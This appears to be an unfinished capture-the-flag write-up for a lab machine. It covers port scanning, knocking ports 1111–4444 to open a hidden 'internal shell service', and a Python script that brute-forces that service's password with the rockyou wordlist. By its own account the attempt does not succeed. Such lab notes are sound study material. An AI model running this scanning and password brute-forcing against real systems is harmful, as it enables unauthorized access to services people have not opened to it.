1. nmap found port `8080,22` open
2. http://TARGET_IP:8080/docs/CHANGELOG.html we can assume that the version of phpBB is 3.3.3. (no exploits)
3. on port 8080 there was a forum with hint: ` Knock knock! Magic numbers: 1111, 2222, 3333, 4444`

4. this suggests we need to do port knocking to let the firewall allow us access protected ports

```console
$ knock 10.48.175.53 1111 2222 3333 4444 -d 500 -v
hitting tcp 10.48.175.53:1111
hitting tcp 10.48.175.53:2222
hitting tcp 10.48.175.53:3333
hitting tcp 10.48.175.53:4444

$ rustscan -a 10.48.175.53 -b 500

Open 10.48.175.53:22
Open 10.48.175.53:4420
Open 10.48.175.53:8080
```

5. revealed a new port `4420` after we knock the ports

```
$ telnet 10.48.175.53 4420
Trying 10.48.175.53...
Connected to 10.48.175.53.
Escape character is '^]'.
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
```

6. bruteforce script:

```py
import socket

TARGET_IP="10.48.175.53"
TARGET_PORT=4420

def check_pwd(pwd: str) -> bool:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((TARGET_IP, TARGET_PORT))
    client.recv(1024) # drain prev prompt
    client.send(pwd.encode() + b"\n")
    data = client.recv(1024)
    client.close()
    return "Invalid password..." not in data.decode()

if __name__ == "__main__":
    with open("/usr/share/wordlists/rockyou.txt", encoding="latin-1") as f:
        passwd_lst = f.read().split("\n")

    for pwd in passwd_lst:
        if check_pwd(pwd):
            print("[+] Found", pwd)
```

7. No success unable to crack the password

Tried:

- sending udp packets instead of tcp



